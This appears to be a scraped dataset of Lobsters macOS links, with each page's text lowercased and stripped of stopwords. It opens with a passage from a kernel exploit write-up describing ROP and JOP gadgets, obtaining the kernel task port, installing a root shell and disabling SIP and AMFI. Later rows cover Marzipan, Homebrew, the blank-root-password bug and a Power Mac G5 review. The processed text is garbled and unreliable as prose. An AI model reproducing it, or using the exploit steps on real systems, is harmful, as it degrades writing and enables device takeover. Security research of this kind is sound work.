memcpy hibernatestatsgraphicsreadytime osarray sysctlbyname kernhibernatestatistics read value pointer array graphicsreadytime calculate kernel address shared memory one possible address actually recall x x x stuff earlier mean might actually one two page matter much make sure rop chain fit single page copy first three page shared memory exploit newly gained freedom need corrupt another kosbooleantrue pointer point something shared memory point remember earlier settled instead inflated array per notification port come play since freeing array returning userland byte memory gone add least amount much offset evg order touch unmapped memory cause panic since way offset evg actually overlap byte previous allocation since may hole allocation map v chosen double amount add offset safe put u though little playing edge mapped memory used array per notification port value would even higher might make thing harder u seems strike good balance point stand u arbitrary code execution pivoting stack happens exist nice function xor rbp rbp mov rsp rsi call rdi chip second instruction effectively give u function take new rip first argument new stack pointer second course load two value memory first conveniently achieved jop gadget osserializer serialize believe first used benjamin randazzo trident osserializer serialize push rbp mov rbp rsp mov rdx rsi mov rax qword rdi mov rcx qword rdi mov rsi qword rdi mov rdi rcx pop rbp jmp rax since committed rewriting lower bit pointer evg put fake vtable pointer shared memory since reach instead simply put one still hibernatestats point shared memory leaf u rdi pointing hibernatestats rax shmem however run another jop gadget update rdi suitably mov rdi qword rax mov rsi call qword rax long last get rsp pointing shared memory chain gadget like used implemented srchidmainc gadget finder residing srchidropc wreaking havoc trouble went get high time damage let get root bring kernel task port userland install root shell disable sip amfi good getting root trivial rop zero field cruid crruid crsvuid process posix credential bzero posixcredget procucred currentproc order update thing like eg host port type ikothostpriv also call setuid thereafter userland get back rop next kernel task port bit problematic used past explain technical detail readme kext leave bottom line evil pointer comparison get around mean machvmremap kernelmap remapaddr sizeof taskt vmflagsanywhere vmflagsreturndataaddr zonemap kerneltask false dummy dummy vminheritnone machvmwire realhost kernelmap remapaddr sizeof taskt vmprotread vmprotwrite realhostspecial ipcportmakesend ipcportallocspecial ipcspacekernel ipckobjectset realhostspecial remapaddr ikottask make possible obtain working kernel task port userland calling hostgetspecialport machhostself hostlocalnode kerneltask long root put rop chain rest carry rest plan userland generally find lot easier one last thing better happen rop though repair remember overflowed hibernatestats memcpy byte might corrupted thing sierra seem anything important berzo ing memory suffices high sierra though gfslock sits since pointer iolock gon na get panic kernel try dereference luckily u happens combination hibernation occur running anyway repair machine gon na panic next time put sleep believe fun debug simple call iolockalloc save u trouble though future might also arbitrary thing hibernatestats got ta adapt whatever find let leave rop go back userland root first thing setuid update host port use get kernel task port wan na disable sip amfi install root shell root could already put suid binary somewhere obviously wan na put cool place like systempwned thing stopping u mac policy number file ops prevent u making change system nvram ops prevent u adding bootargs would disable amfi setting csractiveconfig would disable sip required order amfigetoutofmyway honoured let zero filesystem nvramrelated ops policy good go implemented srchidropc rop chain srchidmainc kernel patch persistence srchelperhelperc root shell achieved nothing left u print awesome ascii art exit conclusion woah one tiny ugly bug fifteen year full system compromise lot changed since last writeup awesome experience whole lot work learned insane amount new thing move new time dealing rather public bug think say managed quite nicely p thank go people quoted work well project overly awesome reverse engineering toolkit entire project available github hesitate shoot question feedback twitter via mail net siguza cheer reference
354,Lobsters,mac,Apple macOS,Marzipan,https://daringfireball.net/2017/12/marzipan,marzipan,marzipan apple plan combined iphone ipad mac apps create one user experience acorn excellent piece reading line gurman report terrible appkit trace root way back nextstep late nscolor uicolor uxkit uikit macos important mac thriving gurman cite twitter example gu mueller rambo figured create app using code available github ilja iwas complained recently hysteresis eaglefiler spamsieve similar concern jeff johnson twitter also johnson recent redoubling,marzipan saturday december mark gurman intriguing story bloomberg week problem start headline apple plan combined iphone ipad mac apps create one user experience gurman probably write headline even make sense io concept mouse cursor run touchscreen device macos support touchscreen device requires mouse pointer one user experience neither possible desirable truth effort apple almost certainly crossplatform application instead crossplatform framework developer developer news user news gurman starting early next year software developer able design single application work touchscreen mouse trackpad depending whether running iphone ipad operating system mac hardware according people familiar matter developer currently must design two different apps one io operating system apple mobile device one macos system run mac lot work apple customer long complained mac apps get short shrift apple developing strategy part next major io macos update said people requested anonymity discus internal matter codenamed marzipan secret project planned multiyear effort start rolling early next year may announced company annual developer conference summer gu mueller designer developer excellent acorn wrote excellent piece reading line gurman report feel like article gurman could reduced think apple might day shared ui framework io macos apple could even create sort cross store bundling single store single binary platform using framework even though nothing stopping apple today sound neat cool platform also used processor boot may may happen starting next year could likely canceled well apple declined comment sensational story crux article apple working shared ui framework io macos find surprising could also see written completely swift though personally rather objc maximum interop existing framework history filled cross platform uis writeonce runanywhere dream none turned insanely great quibble mueller piece none turned insanely great way generous description writeoncerunanywhere application framework terrible none good least none good perspective make truly native mac io apps good everyone perspective certainly apple lot work involved getting iphone app work well ipad still see iphoneonly apps even good new crossplatform macios framework would way work involved bring iphone app mac bring ipad would le work today still far supporting ipad high level user interface native mac apps written using framework called appkit appkit trace root way back nextstep late appkit nextstep root remain pervasive today class name developer use writing cocoa apps mac still prefixed n apple created io rather port appkit effectively hit reset button created newfromthegroundup set framework called uikit appkit mac uikit io tvos uikit fresh start short sort could would differently take appkit result benefitted decade lesson learned unwanted baggage dropped name one many difference appkit nscolor uikit uicolor nscolor uicolor serve purpose specifying entire user interface never platform fundamentally different mac iphone specifying thing like say color could never seen anyone argue appkit brought io many call ever since first sdk iphone appeared uikit brought mac guilherme rambo wrote piece last year uxkit uikit macos important painfulness working appkit killing mac platform really awesome io apps would benefit lot macos counterpart developer simply cope burden developing choose one popular hint macos instead people making crappy webbased apps shoving app hundred megabyte calling macos apps believe would possible single ui framework io macos changed mind saw uikit work tvos think framework different visual language functionality addedremoved based need platform uikit tvos facility work remote control controlling focus parallax effect ubiquitous platform uikit io touch input gesture recognizers toolbars navigation bar uikit macos would window controller contextual menu statusbar item little hyperbolic say anything killing mac platform today mac thriving question maintaining parallel io mac apps work today could also true many company native mac apps prioritized lower native io gurman cite twitter example example iphone ipad twitter app regularly updated social network latest feature mac version refreshed recently widely considered substandard single app machine mac ipad iphone user get new feature update time last sentence naive twitter could somehow generate mac app io app without effort would terrible mac app nobody want io app running window mac best would take le work today maintain mac app guarantee twitter would work regardless much easier would today gu mueller easy solution updating mac version twitter feature io peer twitter care enough update need massive engineering effort put behind road already explored server apis already exposed must done io version need put effort care tweetie mac twitter mac based built ground single person twitter maintain twitter inc bothered caring ultimately make true mac apps mac apps caring detail caring mac way thing amount shared framework macos io make io developer care thing properly mac apple mac photo app implemented largely using private framework called uxkit many way uikit mac curious uxkit rambo figured create app using interesting thing uxprefixed class implementation uikit control top appkit uxlabel uxcollectionview uxnavigationcontroller uxviewcontroller much see whether right decided try build really simple app using uxkit code available github app let user search photo flickr select see bigger version really simple working app noticed felt like working io app think developer familiar uikit would problem making macos apps using uxkit know apps use uxkit currently macos photo app pricing app one used apple store concern whole situation even true apple indeed working creating crossplatform uikitlike framework io macos existence framework would spur developer company create mac apps inevitably lead creation good mac apps even apple much concern fallen short regard photo mac one worst mac apps use love icloud photo library syncing set thousand ten thousand actually case photo video sync device knowing backed apple server great experience term serving repository photo video photo mac work well term acting like good mac app even something simple fundamental mac experience draganddrop screwed photo drag image photo pretty much drop finder first start new drag new file copied finder actually drop many context developer ilja iwas complained recently almost year drag image photo safari extension every macos application us webviews like garagesale many party apps work image imagine default image handling app mac platform communicate via drag drop default browser going almost year desktop platform used excel drag drop day go without frustrated user asking support team garagesale receive drag photo try dragging image photo main photo window background work need activate window first drag file managertype app mac allows drag initiated background try doubleclick hold image photo drag say doubleclick image let go button second click photo mac initiate drag nut doubleclick hold drag create selected range multiple item list item doubleclick first item selection one drag added selection nonlist view like icon view finder doubleclickanddrag nothing addition nonstandard particular behavior get way want open image photo mac allow hysteresis pointer movement doubleclick mac user never notice doubleclick something mac mouse pointer allowed move slightly first second click slight movement especially common using trackpad happen mouse notice result always intended early version window lacked hysteresis doubleclicking felt brittle unreliable slight mouse movement first second click would render doubleclick attempt void photo mac try doubleclick image photo inadvertently move mouse pointer click wind starting drag instead opening image ever felt clumsy trying open image photo fault apple get started keyboard shortcut photo get back image opened detail view list thumbnail esc escape key work use space bar shortcut might well escswearspace bar even year get used though photo mac created io developer saw mac one time said sure use photo despite crummy mac interface photo poor poster child argument apple make easier developer experience io create mac apps longtime mac developer michael tsai author eaglefiler spamsieve similar concern long seemed like obvious thing apple sure good mac platform upside get lot port io apps previously mac app poor quality webbased one downside want using lowest common denominator io port like using mac apps really take advantage desktop offer continually annoyed apps essentially put iosstyle interface window support standard mac convention feature also worry bifurcating platform uxkit appkit apps inevitably mean apple focus le enhancing appkit time doubling surface area bug two class mac apps would good appkit going way carbon would even worse jeff johnson twitter seems big cultural divide io developer came mac io developer many latter group ok destroying mac frustrating also johnson tweet start good thread something crystalized yesterday afraid many uikit developer appkit unfortunate similarity vastly outnumber difference short apple goal make easier developer create good mac apps easier mac io app sibling share code apple goal make easier get io apps run mac slightly modified form think nonsensical think apple working toward single unified o best reason hope front recent redoubling apple effort pro mac hardware imac pro designed run iphone
355,Lobsters,mac,Apple macOS,"Apple Plans Combined iPhone, iPad & Mac Apps to Create One User Experience",https://www.bloomberg.com/news/articles/2017-12-20/apple-is-said-to-have-plan-to-combine-iphone-ipad-and-mac-apps,apple plan combined iphone ipad mac apps create one user experience,detected unusual activity computer network,detected unusual activity computer network continue please click box let u know robot
357,Lobsters,mac,Apple macOS,Homebrew 1.4.0 Released,https://brew.sh/2017/12/11/homebrew-1.4.0/,homebrew released,removed migrating notable formula homebrewcore archived deprecated archived available,today like announce homebrew significant change since homebrew filter environment variable major change deprecation since homebrew filter user environment variable reduces error installing formula source homebrew command homebrew bottle hook removed added originally remove boxen monkeypatching homebrew internal private apis longer necessary used boxen homebrewscience tap migrating notable formula homebrewcore archived january homebrewapache tap deprecated archived also deprecate archive homebrewphp tap last minor version homebrew migrated deprecated archived formula tap homebrew organisation improve reliability consistency discoverability formula homebrew organisation macos version analytics available brewsh homepage change since like highlight following finally thanks hardworking maintainer contributor sponsor supporter getting u far enjoy using homebrew
358,Lobsters,mac,Apple macOS,"MacOS Update Accidentally Undoes Apple's ""Root"" Bug Patch",https://www.wired.com/story/macos-update-undoes-apple-root-bug-patch/,macos update accidentally undoes apple root bug patch,glaring hole operating system security measure update page,company like apple rush software patch critical security bug deserves praise protecting customer quickly except perhaps patch rushed nearly buggy code designed fix earlier week apple scrambled push software update macos high sierra sew glaring hole operating system security measure person malicious program tried log mac computer install software change setting thus hit prompt username password could simply enter root username password bypass prompt gain full access computer apple initial patch came hour bug first reportedbut multiple mac user confirmed wired apple fix problem serious glitch yet upgraded operating system original version high sierra recent version downloaded patch say root bug reappears install recent macos system update worse two mac user say also tried reinstalling apple security patch upgrade find root problem still persists reboot computer warning reboot necessary really serious everyone said hey apple made fast update problem hooray say volker chartier software engineer german energy firm innogy first alert wired issue apple patch soon update come back one know thomas reed malwarebyteseven mac user knew reinstall security patch upgraded high fact apple would eventually install update automatically user affected root could still left vulnerable say thomas reed applefocused researcher security firm malwarebytes reed confirmed reopened root bug installed apple security fix problem found rebooted could even type root without password entirely bypass high sierra security protection installed update app store verified could still trigger bug bad bad bad say reed anyone nt yet updated pipeline headed straight issue mac administrator chris franson technical director northeastern university tell wired repeated sequence event found root bug persisted noted rebooting updating reinstalling security cause security update finally kick resolve issue malwarebytes reed confirmed note however apple security update nt tell user reboot installing could easily someone nt reboot computer month say reed good thing wired reached apple flaw patch nt yet heard back monday company added extra warning security update page root bug recently updated macos high sierra reboot mac make sure security update applied properly bug apple bugfix nt course bad original root problem one clear many high sierra user might installed security patch upgrading recent version operating system even everyone affected even among affected many likely rebooted computer leave protected
360,Lobsters,mac,Apple macOS,About the security content of Security Update 2017-001 (fixes local root auth bypass),https://support.apple.com/en-us/HT208315,security content security update fix local root auth bypass,security content security update apple security update apple security update apple product security apple product security pgp key cveid security update directory utility system report reenable root user change root user password contact vendor,security content security update document describes security content security update apple security update customer protection apple nt disclose discus confirm security issue investigation occurred patch release available recent release listed apple security update page information security see apple product security page encrypt communication apple using apple product security pgp key apple security document reference vulnerability cveid possible security update released november directory utility available macos high sierra macos high sierra impacted macos sierra earlier impact attacker may able bypass administrator authentication without supplying administrator password description logic error existed validation credential addressed improved credential validation entry updated november recently updated macos high sierra reboot mac make sure security update applied properly see mrtconfigdata installation list software system report mac also protected confirm mac security update open terminal app utility folder application folder type usrlibexecopendirectoryd press return security update installed successfully see one project version number macos high sierra macos high sierra require root user account mac need reenable root user change root user password update information product manufactured apple independent website controlled tested apple provided without recommendation endorsement apple assumes responsibility regard selection performance use thirdparty website product apple make representation regarding thirdparty website accuracy reliability contact vendor additional information published date december
361,Lobsters,mac,Apple macOS,Why <blank> Gets You Root,https://objective-see.com/blog/blog_0x24.html,blank get root,posted lemiorhan tweet osstatuscom support site security release note broke alvarnell reported wired bruienne noted thomasareed comprehensively summarizing,blank get root tracking cause serious authentication flaw love blog post support tool writing patreon mahalo background case nt heard news massive security flaw affect latest version macos high sierra bug allows anybody log root account blank password choosing yikes apparently vulnerability first posted rather innocuously apple developer forum order aid user account access issue however flaw gained wider public attention lemi orhan ergin lemiorhan posted tweet stating noticed huge security issue macos high sierra quite intrigued bug decided reverse macos track root cause blog post reveal finding uncover underlying reason bug without ado let dive right digging deeper first let look happening high level user attacker attempt log account currently enabled ie root unknown reason system naively create account whatever password user specifies even password blank user attacker readily log account two step process explains perform attack one hit enter click unlock twice also turn user service screen sharing enabled attack performed remotely course one able randomly enable account especially powerful root account remotely without providing sort authentication wtf going time dig macos see going behind scene user attacker try authenticate account handled opendirectory daemon opendirectoryd debugging daemon view sequence function call occurs daemon receives mach xpc authentication message p aux grep opendirectoryd root usrlibexecopendirectoryd lldb p lldb bt frame opendirectoryd odverifycryptpassword frame plistfile plistfile frame plistfile odmrecordverifypassword frame opendirectoryd opendirectoryd frame opendirectoryd opendirectoryd start odmrecordverifypassword function function implemented plistfile binary bundle library dynamically loaded opendirectoryd systemlibraryopendirectorymodulesplistfilebundle lldb image list usrlibexecopendirectoryd systemlibraryopendirectorymodulesplistfilebundlecontentsmacosplistfile setting breakpoint odmrecordverifypassword function dump argument passed via rdi rsi rdx rcx process stopped thread stop reason breakpoint plistfile odmrecordverifypassword pushq rbp lldb po rdi osodmodule lldb po rsi osodconnection lldb po rdx osodrequest lldb po rcx osodmoduleconfig looking decompilation see invokes another function odconnectiongetcontext rbx final parameter passed function dictionary containing information account user attacker attempting authenticate lldb po dsattrtypestandard applemetanodelocation localdefault dsattrtypestandard generateduid dsattrtypestandard password dsattrtypestandard recordname root builtinlocal system dsattrtypestandard recordtype dsrectypestandard user dsattrtypestandard uniqueid note value dsattrtypestandard password key see value later next odmrecordverifypassword invokes another helper function turn invokes string decompilation function state read shadowhash data account user attacker trying log shadowhash data stored dsattrtypenative shadowhashdata key shadowhash user viewed terminal via dscl read user user command directly reading privatevardbdslocalnodesdefaultusers user dscl read usersuser authenticationauthority shadowhash hashlist user lkdc generateduid noted enabled account user account succeed shadowhash data exists however disabled account root account targeted information present dscl read usersroot grep shadowhash wc shadowhash data exist fail returning cause else clause executed function rax rax found shadow hash data shadow hash data found else read dsattrtypestandard password rax odproplistgetarray kodattributetypepassword odverifycryptpassword rax upgrade password else code first read value kodattributetypepassword dsattrtypestandard password key invokes odverifycryptpassword function verify password passed user attacker match password account example one try log disabled root account password odverifycryptpassword invoked dsattrtypestandard password value root account process stopped thread stop reason breakpoint opendirectoryd odverifycryptpassword lldb po rdi osodrequest lldb po rsi nscfarray lldb po rdx step call return nonzero value al implying success interesting lldb reg read al al since nonzero value returned check performed code executes logic assumes valid password provided even though case specifically various method invoked debug log statement decompilation show perform upgrade crypt password shadowhash securetoken found crypt password userrecord upgrading shadowhash securetoken look upgrade subroutine invoked password provided ie process stopped thread stop reason breakpoint plistfile plistfile callq subq rsp movq rbp rdi movq rbp rsi lldb po rsi new userspecified value converted shadowhashsecuretoken saved account ie root thus user attacker log account accessible password specified fail let recap user attacker attempt authenticate account password including blank account disabled ie nt shadowhash data macos attempt perform upgrade upgrade odverifycryptpassword return nonzero value check performed code assumes success new userprovided password upgraded shadowhashsecuretoken saved account explains mostly root account activated accessed arbitrary blank password question remaining well bug made thru qa testing high sierra release odverifycryptpassword function fail fail detected let take closer look name implies odverifycryptpassword verify user attacker specified password valid account example try authenticate disabled root account odverifycryptpassword tell u simply gtfo odverifycryptpassword function implemented directly opendirectory daemon opendirectoryd previously mentioned invoked plistfile bundle specifically function check password upgrade necessary odverifycryptpassword rax upgrade password already noted invoked various parameter account password hash userattacker specified password however parameter also importance call set odverifycryptpassword rax looking decimal osstatuscom reveals value corresponds koderrorcredentialsinvalid perform actual password verification odverifycryptpassword function invokes cryptverify function passed account password hash eg disabled root account provided password eg also parameter passed odverifycryptpassword parameter saved register set string comparison hold true int cryptverify int int int int strcmp thru static dynamic analysis determine expected string comparison comparing hash provided password hash account actual password word verifying password hash match process stopped opendirectoryd cryptverify callq symbol stub strcmp lldb x rdi lldb x rsi string clearly nt match strcmp wo nt succeed ie wo nt thus passed parameter tracing wo nt set point clear understanding purpose parameter pointer variable passed odverifycryptpassword set cryptverify function password hash match imagine following pseudo code verify match set verification ok int match koderrorcredentialsinvalid odverifycryptpassword accounthash providedpassword match verify checking hash match set verification ok strcmp providedpwhash accountpwhash user match pointed earlier return value odverifycryptpassword checked result actual verification ie match variable confirmed examining following decompilation show call odverifycryptpassword note match variable never checked call instead upgrade function erroneously invoked apple responds shortly posting blog apple released patch macos patch directly downloaded apple support site show automatically security update macos app store bug assigned apple state security release note simply logic error existed validation credential patch note improved credential validation may wondering patch bug underlying issue uncovered blog correct comparing unpatched patched plistfile binary see apple added code detect invalid credential ie nonauthenticated attacker try set root password specifically expected check result match variable call odverifycryptpassword lea rbx qword load addr match rbx mov rcx rbx move call call impstubsodverifycryptpassword mov ecx dword rbx get value match test ecx ecx jne nomatch bail thus analysis proved correct phew sadly often case apple patch seemed serious issue first broke file sharing various user pointed thanks alvarnell incompatibility quickly fixed new patch bringing build worse yet reported wired user macos applied patch later upgraded macos bug would reintroduced wise pepijn bruienne bruienne noted likely due fact apple nt bump build number nt roll iamroot patch user also reporting applying patch reboot required good friend thomas reed thomasareed published good writeup comprehensively summarizing apple misstep deploying patch conclusion well wrap blog reversed various component opendirectory daemon reveal underlying cause infamous iamroot bug apple released patch determined apple forgot check value essential variable held result account verification patch released reversed confirm finding correct hooray next bug adios love blog post tool support via patreon mahalo
362,Lobsters,mac,Apple macOS,Anyone can login as root on macOS,https://twitter.com/lemiorhan/status/935578694541770752,anyone login root macos,,detected javascript disabled browser would like proceed legacy twitter yes
363,Lobsters,mac,Apple macOS,A review of the Apple Power Macintosh G5 - 14 years later,http://women-and-dreams.blogspot.se/2017/11/apple-power-macintosh-g5-flame-on.html,review apple power macintosh year later,made point chap,let look apple power macintosh weighty space heater also perform computing task apple launched great fanfare nowadays decidedly mixed legacy desktop supercomputer supposed form basis apple product range year come within three year discontinued along entire powerpc range favour completely new computing architecture put mind ageing footballer finally chance play world cup match called substitute bench entertains crowd twenty minute team loses time next world cup uniform player different time sun brief time especially long pc person point view came went blink eye knew striking case reputation high power consumption heat output time rare pc world almost fifteen year later available used market almost nothing postage incredibly awkward decided try one mine dualprocessor model flagship first wave back machine apple word world fastest powerful personal computer turning first time informed local flying club activate powerful radio frequency source sent letter home office british telecom electricity provider inform terrorist soul dead reincarnated jupiter longer wished married helena bonhamcarter furthermore removed clothes fear assumed defensive posture attempting prove observer harm anyone slightly disappointed machine started flame muted whoosh settled quiet hum nothing exploded shuddered masked men burst room instead familiar chime o x loaded still original hard drive noisy date code say constructed august gadget measure power consumption electrical item desktop pc quadcore running ssd two spinning hard drive nvidia gtx built back apart adding graphic card ssd nt felt need power according gadget pc idle watt full whack consumes watt power load modern television perhaps slightly include pc monitor pc rarely run full power play dvd perfectly well like every desktop computer since late predated bluray couple bluray drive useful burning data disc however fastest necessary combination processor grunt graphic hardware decode bluray video even finding powerpc software would play bluray film problematic comparison new fourteenyearold power macintosh two separate powerpc processor running two spinning hard drive ancient radeon idle consumes watt power ten watt le pc load taxed suck watt almost twice much fridge apparently heavy processing power consumption go watt positive side quieter pc fan run slower going mad every osx leopard final version osx powerpcera macintosh leopard ten year old close contemporary window vista whereas vista mocked bloated mess leopard generally regarded decentalbeitinessential upgrade tiger pc person impressed well leopard aged toneddown look middecade osx leopard still attractive recognises usb peripheral without popping open irritating dialogue box interface feel smoother le flaky window xp similarly old machine tabletesque cover flow feature feel ahead time cover flow included first iphone released almost time leopard although apple subsequently fallen love cover flow remains part macos nowadays leopard run obsolete version itunes version faster easier use latest version back debate whether tiger older le featuresome faster leopard feature modern slower best choice power macintosh two mind hunch minor performance hit leopard insignificant faster hand little osx software made obsolete jump photoshop logic pro also work beyond feeling completeness pressing practical need switch pair western digital caviar green lying jumper pin force sataiii mode intelpowered macintosh pro four drive bay arranged front back middle machine cold swappable caddy nt quite elegant caddy fixed place drive go backwards still plug sata connector osx software raid support although suspect ssd would sensible bought mainly use logic express music sequencer song wrote combination featured previous post little video logic express performing track complex arrangement mass reverb would sorely tax cpu although would nt hard fix creative bouncing video something melancholic process setting logic express logic big selling point simple interface massive selection genuinely good builtin sound generator particular decent software sampler range usable naturalsounding annoyingly obvious instrument logic us au audio unit plugins instead common vst standard boom time early mass free vstau plugins available year market died partially audio unit included modern logic pro x extensive wellmade partially developer moved something sad hunting old plugins last updated hosted personal website died remain shell c date creative electronic computerbased music flourished early part died suddenly surely case browsing dead link give impression hyperupic sonasphere example appear completely left internet never return fortunately mda destroyfx still exist perhaps touch zdoom work fine far tell powerpc doom port although hardware would capable running coincidence last highprofile powerpc game id software doom nt copy ca nt check powerpc browser actively maintained today tenfourfox based firefox powerbook painfully slow much usable even access web version google drive without grinding halt limited support online highdef video netflix distant dream whole make almost usable everyday machine especially solar power plant imagine late dualcore quadcore would pretty speedy problem course could said almost cheap laptop window tablet released last ten year minus bit solar power plant laptop would probably usb port might well usb would compensate second drive bay anandtech made point tested one later mac mini generally faster using roughly onetenth power macbook pro example slightly le flexible run macos high sierra much faster fourteen year later exterior case still stunning interior however tarnished bit decided benchmark ran trial version geekbench older benchmarking utility run different platform geekbench old neat coincidence us lowestspecification power macintosh benchmark score perhaps author wrote original version nt know dualprocessor score make faster entrylevel model least benchmark score higher reasonable given model lower clock speed slower memory lower bus speed one processor divided three thermal zone front machine left top bottom left right top compartment dvd drive pair fan two hard drive middle compartment fan plus mono speaker mounted front modem followed space pcix card agp graphic card rear machine catch release access panel lower compartment memory sitting beneath wifibluetooth card cpu module heatsinks another pair fan base case contains hefty power supply powerbook wrote last month score drawing watt whilst suggests power macintosh nt much cop putting another way draw six time power contemporary laptop benchmark twice fast realise comparing two different fruit feel like attempt achieve performance gain brute force rather sophistication also feel like result two company different product release schedule trying reach uneasy compromise deficiency masked fact contemporary pc powerhungry therein lie history lesson home computer nt use much electricity noone cared thermal design power computer either aircooled used single fan push air power supply unit however heat became major issue intel pentium introduced small step term performance improvement pentium iii giant leap heat output even without overclocking typical pentium system required psu fan cpu fan case output fan perhaps input fan fan graphic card call earlymid time nine fan eventually pentium design team reached something called power wall whereby gain extra clock speed outweighed difficulty cooling chip furthermore phenomenon called electromigration whereby circuitry degrades higher temperature started eat lifespan chip one reason modern cpu tend use multiple modestlyclocked core rather one single fast processing unit power macintosh actually nine fan power macintosh nine fan two hidden away base machine attached power supply unit four fan front back draw air gigantic cpu heatsinks single fan middle air pci card two small fan blow air hard drive rear motherboard nine fan counted two plus four six plus one seven plus two nine equal nine case array temperature sensor make sure everything cooled effectively machine apparently unique thermal profile stored somewhere bios modification require thermal profile recalibrated fan work properly apple diagnostic tool nt publicly available photoshop technically bridge plus tenfourfox shot use adobe dng converter convert camera raw file good luck finding last version adobe dng converter support powerpc run still competent nowadays case clever piece design work well must better way imagine time brainpower spent dealing heat generation applied problem instead back powerpc chip touted efficient riscbased alternative intel ran lower clock speed contemporary pentiums much work successive generation powerpc chip kept apple macintosh competitive late architecture started lag early introduction secondgeneration pentium efficient clone amd remained competitive mobile chip apple danger desktop machine fall behind powerpc formally known ibm powerpc apple great white hope announced apple keynote presentation available youtube video keynote like something parallel world nowadays apple product announcement full face recognition allglass backing duallens camera rose gold company chose highlight bandwidth bus speed advanced chip fabrication technology nowadays apple nt talk cost sir madam baulk price new macbook pro perhaps sir madam might consider going elsewhere sold cheaper alternative equivalent dualxeon pc also rackmounted file server version xserve something modern apple would never dream releasing time apple fond pointing unix root o x paper looked terrific powerpc chip attached system bus ran lighting speed multiprocessorenabled architecture could access memory sata hard drive awesome case except basic power macintosh machine either two cpu dualcore chip one case two dualcore chip later machine increased memory limit last batch adding support pcie even idea quadcore desktop pc memory plus sata pcie sound current considerable weight focused little pad aftermarket cork pad used masking tape wrap pair old cycle glove around handlestands nt change fact undertaker threw mankind hell cell causing plummet sixteen foot announcer table mentioned earlier apple television advert claimed world fastest powerful personal computer although united kingdom itc objected claim forbade apple repeating ad singleprocessor machine nt particularly impressive new hopefully room expansion whereas pentium xeon several year old seems thing went wrong nt room expansion contraction matter hard ibm tried could nt produce chip would fit laptop powerpc simply powerhungry underclocked nt run much faster architecture questionable benefit mobile context many year later arm demonstrated possible make incredibly frugal powerful mobile risc chip still science fiction early architecture something false start handful application used address space although osx could access huge amount memory nt kernel several year apple abandoned powerpc temporarily took step back predominantly world core duo fully embracing bit year later core duo o x logic express essentially multitrack audio midi sequencer powerbook however run lot instrument effect lack mobile mojo unfortunate world gradually pivoting towards mobile computing mobile internet doubly given half apple profit came laptop fascinating speculate whether ibm inability make mobile result inability lack motivation past ibm made mobile version even sold riscpowered version thinkpad laptop long time ago ibm use mobile chip early apple turned corner profitability ibm point view apple still another customer relatively minor importance ibm might spent fortune setting dedicated power mobile team end something else intel launched pentium great hope would still around ten year development hit brick wall early brief period amd seemed poised become dominant player market intel problem hot powerhungry pentium mirrored ibm whereas ibm uninterested mobile intel made three concerted attempt stuff pentium laptop failing time credit intel nt proud admit defeat going back drawing board company came pentium released world apple putting finishing touch power macintosh pentium perhaps influential cpu early people recognised time exception smallformfactor pc generally fitted laptop limited interest performance enthusiast laptop reputation underpowered noone expected pentium would good name easy confuse earlier pentium furthermore intel insisted downplaying pentium favour centrino platform part unwillingness publicise pentium might come fact design owed pentium iii pentium imagine intel unwilling make pentium look bad given still theoretically desktop flagship long pentium nt outperform pentium mobile chip also benchmarked within percent desktop pentium consuming le power generating le heat brief diversion pentium intel essentially gave pentium favour multicore development pentium sold core architecture mostlymobile core duo desktoporiented core duo went reestablish intel dominant position marketplace apple side project already ported osx architecture rumour pentium development machine actually ran osx faster point apple engineer must become privy pentium development roadmap apple publicly announced saying goodbye powerpc architecture favour intel given notorious heat issue switch intel le shock might impression longterm apple fan fond powerpc era nostalgic like dualprocessor mirrored drive door blind fault apple fan nt like amiga fan thank goodness know admit defeat fan pull straight work generally nt necessary easy enough blow dust heatsinks airflow tends keep interior surprisingly clean fault terminal fixed throwing deep bog buying new one instead singleprocessor model top heatsink fan liquidcooled model enclosed cpu cooling unit single large block pentium life ran alongside powerpc used launched ended life period pentium underwent die shrink scaled roughly doubling performance process powerpc also underwent die shrink performance increase modest last wave multicore impressively fast enough change apple mind first wave consisted entrylevel model also entrylevel model dualprocessor flagship second wave launched introduced efficient processor otherwise similar first wave model sitting top range performancewise second wave seemed slightly faster first third wave came machine much predecessor last batch emerged october introduced dualcore processor pci express port launched already known apple going abandon powerpc therefore doomed last line apple also launched couple orphan dual processor machine filled bottom range singleprocessor model used imac component attempt sell budget model half fourteen different model ran final dualcore model slightly faster firstgeneration dualprocessor last model actually slower predecessor meanwhile later highend model needed liquid cooling unit tame incredible thermal output within year liquid cooling unit developed leak could silently corrode machine away inside unit reliable others nonetheless effect resale value liquid cooled dramatic nt want bother liquid cooling powerful nonliquid thirdwave dualprocessor model dualcore model dualcore model desirable due inclusion pciexpress access panel rigid weighty chunk aluminium entire run fallen timewarp nazi germany circa scrap aluminium could filled sky messerschmidts upgrading generally easy ascending order difficulty easy first memory basic model eight ram slot accept memory pair working inside nt picky mix brand capacity two stick sold plus pair stick plus two pair stick total later model could accept memory although read advance beyond leopard give minimal improvement using something like photoshop lot memory aircooled tend get hot desktop pc four slot two blocked hard drive cable memory easy reach storage model take sata hard drive early model designed satai standard mean use modern sataiii drive put little jumper pin enable sataiii compatibility packet little jumper paste next line use fussy ssds o x nt support trim even though ssds trivially cheap pair old western digital caviar green hdds sitting nothing used instead cloned operating system across original hard drive theory faster caviar green v noisy personal experience new slow drive tend better performer old fast drive us pcix slot compatible original pci card pcix deadend standard common server obliterated pciexpress find pcix card used market came fourport esata pcix card connect external esata hard drive mark unicorn audio interface card useless without external hardware module nt pcix card storage ethernet access raid controller like sadly nt seem pcix usb card esata way essentially sata external drive firewire competitive usb eventually overshadowed usb esata nt transfer power use drive drive array power supply three usb port two firewire port firewire port life never used firewire transfer data probably go grave never used firewire video initial wave shipped graphic card dvi port adc port adc proprietary apple thing like many proprietary apple thing technically clever enough nt seem like deliberate lockin nonetheless nt even take within apple ecosystem let alone outside handful apple monitor supported standard essentially dead even came adcdvi adapter available expensive make sense later used graphic card dual dvi output powerful duallink dvi port could drive apple cinema display early used agp later model used pcie aircooled radeon theory could upgrade card practice accepts macintoshonly version various graphic card available rare used market sold rather separately much point upgrading graphic card unless want use dual monitor o x might feel slightly snappier game available might run faster would wary extra heat power draw everything else optical drive bit flaky sometimes read disc sometimes nt replacing apparently easy going bother brief period early feasible back data writeable dvd availability cheap sd card usb stick point fan bracket antenna component still widely available theory entirely replaceable build new one spare part empty case copy apple thermal calibration software point many available used market longterm ownership proposition problematic fastest model outpaced intel replacement either immediately within couple year thoroughly obsolete nowadays power consumption reminder time oil cheap interestonly mortgage fantastic idea economy going well would continue go well forever using file server overnight rendering machine expensive proposition space heater le efficient actual space heater unless useful work esoteric level fantastic case stripped used house pc although tricky port button nt conform pc standard 